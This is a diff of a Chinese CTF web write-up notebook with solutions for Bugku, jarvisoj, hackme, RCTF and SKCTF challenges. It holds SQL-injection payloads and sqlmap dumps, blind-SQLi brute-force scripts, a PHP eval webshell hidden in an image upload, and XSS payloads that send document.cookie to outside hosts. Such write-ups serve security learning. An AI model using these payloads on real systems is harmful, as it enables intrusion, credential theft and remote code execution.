@@ -746,8 +746,6 @@
 	PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==
 	
 	解码一下
-	<html>
-    <title>Bugku-ctf</title>
   
 	<?php
 		error_reporting(0);
@@ -760,7 +758,6 @@
 		include($file); 
 	//flag:flag{edulcni_elif_lacol_si_siht}
 	?>
-	</html>
 	
 	
 # 成绩单
@@ -771,42 +768,42 @@
 	-1' union select 1,2,3,skctf_flag from fl4g#
 	
 	sqlmap 也能跑出来，牛
-		sqlmap -u URL --data="id=1"
-		[11:01:58] [INFO] the back-end DBMS is MySQL
-		back-end DBMS: MySQL >= 5.0.12
-		发现后台数据库是 mysql
-		
-		列举所有数据库
-		sqlmap -u URL --data="id=1" --dbs
-		available databases [2]:
-		[*] information_schema
-		[*] skctf_flag
-		
-		爆出所有表
-		sqlmap -u URL --data="id=1" -D skctf_flag --tables
-		Database: skctf_flag
-		[2 tables]
-		+------+
-		| fl4g |
-		| sc   |
-		+------+
-		
-		列出内容
-		sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -T fl4g --dump 
-		也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --dump
-		Database: skctf_flag
-		Table: fl4g
-		[1 entry]
-		+---------------------------------+
-		| skctf_flag                      |
-		+---------------------------------+
-		| BUGKU{Sql_INJECT0N_4813drd8hz4} |
-		+---------------------------------+
+	sqlmap -u URL --data="id=1"
+	[11:01:58] [INFO] the back-end DBMS is MySQL
+	back-end DBMS: MySQL >= 5.0.12
+	发现后台数据库是 mysql
+	
+	列举所有数据库
+	sqlmap -u URL --data="id=1" --dbs
+	available databases [2]:
+	[*] information_schema
+	[*] skctf_flag
+	
+	爆出所有表
+	sqlmap -u URL --data="id=1" -D skctf_flag --tables
+	Database: skctf_flag
+	[2 tables]
+	+------+
+	| fl4g |
+	| sc   |
+	+------+
+	
+	列出内容
+	sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -T fl4g --dump 
+	也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --dump
+	Database: skctf_flag
+	Table: fl4g
+	[1 entry]
+	+---------------------------------+
+	| skctf_flag                      |
+	+---------------------------------+
+	| BUGKU{Sql_INJECT0N_4813drd8hz4} |
+	+---------------------------------+
 		
 # 备份是个好习惯
 	d41d8cd98f00b204e9800998ecf8427e
 	d41d8cd98f00b204e9800998ecf8427e
-	提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码 {工具在 F/CTF_tools/源码泄露}
+	提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码
 	得到 index.php.bak
 	<?php
 		include_once "flag.php";
@@ -911,10 +908,10 @@
 		
 	打算直接提交ISecer = $KEY 的反序列化，后面发现在此之前$KEY都没有被定义，所以KEY是空的，
 	只需提交空的序列化上去就可以了
-		<?php
-			$cookie = serialize("$key");
-			print_r($cookie);
-		?>
+	<?php
+		$cookie = serialize("$key");
+		print_r($cookie);
+	?>
 	这样构造一下，就得到了 s:0:"";
 	但是注意;(分号)在cookie中不会被正确的上传到服务器，构造URL编码
 	;的URL编码为%3B
@@ -1012,7 +1009,7 @@
 
 # 文件上传2(湖湘杯)
 	这个题有点坑，我把源码都弄下来后仔细的看能不能绕过，结果看下别人的wp，直接有一个flag.php，我之前没扫出来。
-	这教会了我一个道理，先扫flag，flag.php已加入字典，以后就能扫出来了。
+	这教会了我一个道理，先扫 flag，flag.php 已加入字典，以后就能扫出来了。
 	
 	下面的安全性已经非常高了，后缀被控死
 	upload.php
@@ -1059,15 +1056,6 @@
 	if($w > MAX_IM_SIZE || $h > MAX_IM_SIZE)
 		fatal("Invalid image dimensions.");
 	?>
-	<center>
-	<div class="article">
-		<h2></h2>
-		<p><img src="uploads/<?=$imagekey;?>.png" />
-		<div>
-			<a href="uploads/<?=$imagekey;?>.png">View saved image</a>
-		</div>
-	</div>
-	</center> 
 
 
 	common.php
@@ -1183,6 +1171,7 @@
 	
 # 百越杯 买手机
 	重点学习 zio
+	<?
 	import hashpumpy
 	import urllib
 	from urlparse import parse_qsl
@@ -1512,7 +1501,7 @@
 			if "3fab54a50e770d830c0416df817567662a9dc85c" in hex_dig:
 				print word
 
-
+'
 # lottery Qctf2018
 	<?php
 	function random_num(){
@@ -1715,12 +1704,18 @@
 	题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
 	看到送分题就尴尬了一下，试了下SQL注入，全跳转到id=1，id=2没反应，看下wp，没想到是爆破到id=2333，需要脑洞啊
 	wp：https://www.secpulse.com/archives/67980.html https://www.secfree.com/article/695.html
-	官方wp太辣眼睛
+	官方 wp 太辣眼睛
 
 
 # XCTF 4th-CyberEarth ics-01
+	php://filter/read=convert.base64-encode/resource=index
+	感觉会有文件包含漏洞，但是过滤了 :// 
+	目标：flag/flag/flag/flag/flag/flag/flag.php
+
+	直接扫了一波目录，得到一个 .index.php.swp
 	<?php
 	error_reporting(0);
+	// 限制 php 只能访问此目录
 	ini_set('open_basedir', '/var/www/html');
 	
 	function autoload($page) {
@@ -1811,8 +1806,9 @@
 	}
 
 	?admin=php://input&file=includes/upload.php
-	读到 upload.php 
-
+	随便咋样都能过，所以上面的 stripos($file, 'file_list') 意义何在，读到之前读不了的源码
+	
+	upload.php 
 	<?php
 	if (stripos($_SERVER['QUERY_STRING'], 'flag') > 0) {
 		die('no flag flag flag flag !');
@@ -1834,10 +1830,12 @@
 			die('invalid parameter');
 		}
 
+		// 直接传一个 php 开头的文件
 		if (stripos($name, 'php') > 0) {
 			die('invalid parameter');
 		}
 
+		// 尝试一下 %00 截断，php.php%00.jpg，失败，长度超过了
 		if (substr($name, -3, 3) !== 'zip' && substr($name, -3, 3) !== 'jpg' && substr($name, -3, 3) !== 'png') {
 			die('file can not upload ! ');
 		}
@@ -1881,14 +1879,41 @@
 				die('error');
 			}
 			passthru('cat ' . 'uploaded/' . $_GET['step']);
+			// 或许可以命令注入
 		} else {
 			die();
 		}
 	}
 
+	// includes/unzip.sh
+	#/bin/bash
+	unzip -o ./uploaded/*.zip -d ./uploaded/
+	rm -rf ./uploaded/*.zip
+	rm -rf ./uploaded/*.*
+	rm -rf ./uploaded/*.*
+	touch /var/www/html/includes/uploaded/index.php
+	chmod 000 /var/www/html/includes/uploaded/index.php
 
+	总结，这题其实满满的坑点，没太多意思，但我莫名其妙的坚持下来了，各种尝试，然而环境不给力，依然无法找到 flag
+	这里学到一个新思路，利用软连接，即 Linux 上的快捷方式，实现目录穿越，骚的一b
+	按理说，autoload() 里的这个 include "./includes/$page"; 是可以作为文件包含，结合之前的 unzip.sh 内容，只是删除了带 . 的文件
+	这个思路还是可行的，随便传一个 xxx，然后包含一下就好了，可以直接 system('cat flag')，或者上菜刀
+	我这里还看错了一个地方，[^\w\d_ -] 是非 \w\d，所以数字什么都是可以的，
+	总而言之，这玩意还是去 regex101 调试一下比较稳妥
+	不折腾了，有学到东西就好，flag 不重要
 
+	再记录下软连接的具体操作，使用前提：目录结构很清晰
+	index.php  
+	includes/uploaded/
+	flag/flag/flag/flag/flag/flag/flag.php
 
+	在 includes/uploaded/ 下
+	ln -s ../../flag/flag/flag/flag/flag/flag/flag.php 12345678901234567890
+	打成压缩包
+	zip -y 1.zip 12345678901234567890
+	然后利用 passthru('cat ' . 'uploaded/' . $_GET['step']);
+	?step=12345678901234567890 就可以实现文件读取了
+	话说回来，此题还是有点为了出题而出题的感觉，很多过滤并没实际意义
 
 # bugku insert into 注入题（XFF注入）
 	关键代码
@@ -2205,6 +2230,28 @@
     PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示数据
     如?table=flag`%20`%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag
 
+
+
+# jarvisoj Easy Gallery / upload + lfi (local file inclusion)
+	"没有什么防护是一个漏洞解决不了的，如果有，那就....."
+	扫了一遍目录，没发现什么文件，尝试 filter 读源码，也失败了
+	主题界面是一个图片上传，再加一个展示界面
+	配置信息给的这么清晰，有点可疑，然而并没有找到什么有用的洞
+	Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3
+
+	Warning: fopen(submi.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24
+	按理说是可以文件包含，php://filter/read=convert.base64-encode/resource=index
+	然而显示 Cross domain forbidden!，估计是加了啥子 waf，此路不通
+	fopen() 时应该是拼接了一个 ".php"，这里可以用 %00 绕过
+	fopen(index.jj): failed to open stream 绕过成功
+	
+	图片只能上传 jpg ，所以直接抓包在后面再个一句话，然后用 fopen() 去包含
+	但是，注意是但是，这里有个坑，不能用 <?php，有 waf，要用 <script language="php">eval($_POST[1])</script>
+	然后 page=uploads/1552805580.jpg%00 自动出 flag，都不需要菜刀
+	这题出的太过死板，<?=?> 是可以的，居然没任何回显，专考 <script language="php"> 这标签了，没意义
+	有时间自己改一改出个题
+
+
 # jarvisoj api调用（xxe入门题）
     请设法获得目标机器/home/ctf/flag.txt中的flag值。
 	参考 https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/
@@ -2329,7 +2376,7 @@
 	
 # jarvisoj login
 	header 头里面发现 hint: "select * from `admin` where password='".md5($pass,true)."'"
-	md5(string, raw)
+	md5 ( string $str [, bool $raw_output = FALSE ] ) : string
 	string 要计算的字符串 
 	raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数
 	参考 https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html
@@ -2337,6 +2384,75 @@
 	有个牛逼的字符串： ffifdyop
 	传入之后，最终的 sql 语句变为 select * from `admin` where password=''or'6�]��!r,��b'
 	成功闭合，得到万能密码
+
+
+# jarvisoj RE
+	咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦
+	题目给了个 udf.so 的文件，IDA 启动，然而并没有发现啥东西（汇编还要加油
+	前几天刚看了MySQL提权就忘了，后来才知道 udf.so 也是拿来提权的，
+	http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/
+	
+	将 udf.so 导入到MySQL的插件里面，注意改下权限
+	mysql> show variables like "%plugin%";
+	+-------------------------------+------------------------+
+	| Variable_name                 | Value                  |
+	+-------------------------------+------------------------+
+	| default_authentication_plugin | mysql_native_password  |
+	| plugin_dir                    | /usr/lib/mysql/plugin/ |
+	+-------------------------------+------------------------+
+	2 rows in set (0.00 sec)
+
+
+	mysql> create function help_me returns string soname 'udf.so';
+	Query OK, 0 rows affected (0.00 sec)
+
+	mysql> select help_me();
+	+---------------------------------------------+
+	| help_me()                                   |
+	+---------------------------------------------+
+	| use getflag function to obtain your flag!!  |
+	+---------------------------------------------+
+	1 row in set (0.00 sec)
+
+	mysql> create function getflag returns string soname 'udf.so';
+	Query OK, 0 rows affected (0.00 sec)
+
+	mysql> select getflag();
+	+------------------------------------------+
+	| getflag()                                |
+	+------------------------------------------+
+	| PCTF{Interesting_U5er_d3fined_Function}  |
+	+------------------------------------------+
+	1 row in set (0.00 sec)
+
+
+# jarvisoj flag在管理员手里
+	然而又是 hash 扩展攻击，不做了
+	<?php 
+	$auth = false;
+	$role = "guest";
+	$salt = '32342';
+	if (isset($_COOKIE["role"])) {
+		$role = unserialize($_COOKIE["role"]);
+		$hsh = $_COOKIE["hsh"];
+		if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
+			$auth = true;
+		} else {
+			$auth = false;
+		}
+	} else {
+		$s = serialize($role);
+		setcookie('role',$s);
+		$hsh = md5($salt.strrev($s));
+		setcookie('hsh',$hsh);
+	}
+	if ($auth) {
+		echo "<h3>Welcome Admin. Your flag is ";
+	} else {
+		echo "<h3>Only Admin can see the flag!!</h3>";
+	}
+	?> 
+
 
 
 # jarvisoj IN A Mess
@@ -2400,8 +2516,47 @@
 	?id=2/*233*/uniounionn/*233*/selselectect/*233*/1,2,group_concat(id,context,title)/*233*/frfromom/*233*/content%23
 	==> 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666
 
+# jarvisoj web
+	是一个输入框，输入密码，显示密码错误
+	扫不到其他目录，看看源码，有个 app.js 
+	搜索 Wrong Password!!
+	$.post("checkpass.json", t,
+	function(t) {
+		self.checkpass(e) ? self.setState({
+			errmsg: "Success!!",
+			errcolor: b.green400
+		}) : (self.setState({
+			errmsg: "Wrong Password!!"
+			......
+		}))
+	})
+
+	跟进去
+	function(e) {
+		if (25 !== e.length) return ! 1;
+		for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));
+		for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {
+			for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];
+			if (i !== r[n]) return ! 1
+		}
+		return ! 0
+	}
+
+	变成了一个数学题，解线性方程组
+	import numpy as np
+	o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]
+	r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]
+	o = np.array(o)
+	r = np.array(r)
+	x = np.linalg.solve(o,r)
+	res = ''
+	for i in x:
+		res += chr(int(str(i)[0:-2]))
+	print(res)
+
+
 # jarvisoj PHPINFO
-	下面是题目给出的源码
+	下面是题目给出的源码，这题直接给出了 phpinfo，会有很多有意思的解法，以后慢慢补充
 	<?php
 	//A webshell is wait for you
 	ini_set('session.serialize_handler', 'php');
@@ -2436,6 +2591,7 @@
 			object(stdClass)#1 (0) {
 			}
 		}
+	"
 	即 PHP 获取 SESSION 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”，
 	并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，找到下一个竖线，执行同样的操作，
 	直到成功。
@@ -2462,7 +2618,7 @@
 		)
 	)
 
-	存入 session 里的形式是这样的，由此看出，field_name 也是可控的，不一定要用 filename
+	存入 session 里的形式是这样的，由此看出，field_name 也是可控的，不一定要用 filename"
 	$_SESSION["upload_progress_123"] = array(
 		"start_time" => 1234567890,   // The request time
 		"content_length" => 57343257, // POST content length
@@ -2504,104 +2660,92 @@
 
 
 # jarvisoj Chopper
+	这个代理有点莫名其妙
 	/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php
 
 
-# 2018-RCTF r-cursive
-	<?php
-	sha1($_SERVER['REMOTE_ADDR']) === 'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7' ?: die();
-	';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
+# jarvisoj babyxss
+	Hint1: csp bypass
+	有 CSP 的基本上就是 xss 题了
+	Content-Security-Policy: default-src 'self'; script-src 'self'  即只能加载同域的 js
+	（此处如果有上传点，可以先传一个js上去，自然就同域了
+	扔到 https://csp-evaluator.withgoogle.com/ 检测下
+	鲜红的：object-src [missing]  
+	object-src	定义 \<applet>、\<embed>、\<object> 等引用资源加载策略
+	参考 https://hurricane618.me/2018/06/30/csp-bypass-summary/
+	
+	<link rel="prefetch" href="http://demo.wywwzjj.top:8001/?c=[cookie]"> 
+	<link rel='preload' href='http://demo.wywwzjj.top/public/xss.js'>
+	<link rel='prefetch' href='http://demo.wywwzjj.top/public/xss.js?c=jdklfa'>
+	<link rel='prefetch' href='120.77.176.168:11122?c=jdklfa'>
+	<link rel='prefetch' href='35.201.152.114:8001?c=jdklfa'>
 
-	这个绕过有点牛逼：curl "http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: phpinfo();" -H "Accept: asdasd/asdasda"
+	<meta http-equiv="refresh" content="0; url='http://35.201.152.114:8001/xxx.jpg?refresh'">
+	
 
-	(PHP 4 >= 4.0.4, PHP 5, PHP 7)
-	get_defined_vars — 返回由所有已定义变量所组成的数组
+	<script>
+		var lin = document.createElement("link");
+		lin.setAttribute("rel", "prefetch");
+		lin.setAttribute("href", "http://35.201.152.114:8001?a=" + document.cookie);
+		document.head.appendChild(lin);
+	</script>
+
+	
+	利用此脚本填md5验证码
+	
+	import random
+	import string
+	import hashlib
+
+	def md5(s):
+		s = s.encode(encoding='utf8')
+		m = hashlib.md5()
+		m.update(s)
+		return m.hexdigest()
+
+	if __name__ == "__main__":
+		target = input()
+		while 1:
+			string = ''
+			s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
+			if md5(s)[:4] == target:
+				print(s)
+				break 
+
 
 #hackme xss
 
 	<img STYLE="background-image:url(javascript:alert('XSS'))">
 
-<img STYLE="background-image:url(http://demo.wywwzjj.top:8001)">
+	<img STYLE="background-image:url(http://demo.wywwzjj.top:8001)">
 
-http://demo.wywwzjj.top:8001
-
-
-
-<script>
-document.location="http://demo.wywwzjj.top:8001?cookie="+document.cookie
-new Image().src="http://demo.wywwzjj.top:8001?cookie="+document.cookie
-</script>
-<img src="http://demo.wywwzjj.top:8001?cookie="+document.cookie></img>
-
-<svg/onload="document.location='http://demo.wywwzjj.top:8001'">
+	http://demo.wywwzjj.top:8001
 
 
 
-<script
-)
-onmouseover
-onload
-onfocus
-<iframe
+	<script>
+	document.location="http://demo.wywwzjj.top:8001?cookie="+document.cookie
+	new Image().src="http://demo.wywwzjj.top:8001?cookie="+document.cookie
+	</script>
+	<img src="http://demo.wywwzjj.top:8001?cookie="+document.cookie></img>
 
-<svg/onload=document.location="http://demo.wywwzjj.top:8001?cookie="+document.url>
-url --> undefinded
-referer --> localhost/read.php
-
-所以咱们可以看看 config.php 有什么内容
+	<svg/onload="document.location='http://demo.wywwzjj.top:8001'">
 
 
 
-# SKCTF login3
-	hint: 基于布尔的SQL盲注
-	过滤了：空格 * 常用空格符 + ; union and = ,
-	database() length=8
-	'# 
-	import requests
+	<script
+	)
+	onmouseover
+	onload
+	onfocus
+	<iframe
 
-	str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="
-	re = requests.session()
-	url = 'http://123.206.31.85:49167/index.php'
+	<svg/onload=document.location="http://demo.wywwzjj.top:8001?cookie="+document.url>
+	url --> undefinded
+	referer --> localhost/read.php
 
-	def database():
-		res = ''
-		for i in range(1,9):
-			for j in str_all:
-				exp = "admin'^(ascii(mid(database()from({})))<>{})#".format(i, ord(j))
-				data = {
-					'username': exp,
-					'password': 3242
-				}
-				html = re.post(url=url, data=data).text
-				#print(data)
-				if 'error' in html:
-					res += j
-					print(res)
-					break
-		# blindsql
-		# username=admin'^(select(0)from(admin))#&password=fgasrd
-		# 
+	所以咱们可以看看 config.php 有什么内容
 
-	def password():
-		res = ''
-		for i in range(1,39):
-			for j in str_all:
-				exp = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})#".format(i, ord(j))  
-				# where(username='admin')
-				data = {
-					'username': exp,
-					'password': 3242
-				}
-				html = re.post(url=url, data=data).text
-				#print(data)
-				if 'error' in html:
-					res += j
-					print(res)
-					break
-
-		# 51b7a76d51e70b419f60d3473fb6f900
-
-	password()
 
 
 # hackme command-exeutor
@@ -2700,6 +2844,7 @@ referer --> localhost/read.php
 		$cmds = ['ls', 'env'];
 		foreach($cmds as $c) {
 			printf('<li><a href="index.php?func=cmd&cmd=%s">%1$s<L2E'
+
 
 
 	# ls
@@ -2801,4 +2946,90 @@ referer --> localhost/read.php
 			}
 		}
 	}
+	?>
+
+
+
+
+# 2018-RCTF r-cursive
+<?php
+sha1($_SERVER['REMOTE_ADDR']) === 'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7' ?: die();
+';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
+
+这个绕过有点牛逼：curl "http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: phpinfo();" -H "Accept: asdasd/asdasda"
+
+(PHP 4 >= 4.0.4, PHP 5, PHP 7)
+get_defined_vars — 返回由所有已定义变量所组成的数组
+
+
+
+# SKCTF login3
+	hint: 基于布尔的SQL盲注
+	过滤了：空格 * 常用空格符 + ; union and = ,
+	database() length=8
+	'# 
+	import requests
+
+	str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="
+	re = requests.session()
+	url = 'http://123.206.31.85:49167/index.php'
+
+	def database():
+		res = ''
+		for i in range(1,9):
+			for j in str_all:
+				exp = "admin'^(ascii(mid(database()from({})))<>{})#".format(i, ord(j))
+				data = {
+					'username': exp,
+					'password': 3242
+				}
+				html = re.post(url=url, data=data).text
+				#print(data)
+				if 'error' in html:
+					res += j
+					print(res)
+					break
+		# blindsql
+		# username=admin'^(select(0)from(admin))#&password=fgasrd
+
+	def password():
+		res = ''
+		for i in range(1,39):
+			for j in str_all:
+				exp = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})#".format(i, ord(j))  
+				# where(username='admin')
+				data = {
+					'username': exp,
+					'password': 3242
+				}
+				html = re.post(url=url, data=data).text
